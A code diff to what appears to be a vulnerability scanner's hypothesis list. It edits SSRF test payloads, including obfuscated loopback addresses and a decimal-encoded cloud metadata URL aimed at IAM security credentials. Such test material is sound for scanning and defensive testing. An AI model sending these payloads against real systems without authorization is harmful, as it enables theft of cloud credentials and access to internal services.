@@ -117,13 +117,13 @@ DEFAULT_HYPOTHESES: list[dict[str, Any]] = [
         "vuln_type": "ssrf",
         "description": "Parameter is used as a URL to fetch — SSRF possible",
         "tests": [
-            {"payload": "http://0177.0.0.1/#.yaml", "expect": "different_response", "weight": 0.3},
+            {"payload": "http://0177.0.0.1/", "expect": "different_response", "weight": 0.3},
             {
-                "payload": "http://2852039166/latest/meta-data/iam/security-credentials/#.yaml",
+                "payload": "http://2852039166/latest/meta-data/iam/security-credentials/",
                 "expect": "contains_metadata",
                 "weight": 0.5,
             },
-            {"payload": "http://0#.yaml", "expect": "different_response", "weight": 0.2},
+            {"payload": "http://0", "expect": "different_response", "weight": 0.2},
             {"payload": "http://0177.0.0.1", "expect": "different_response", "weight": 0.2},
         ],
     },
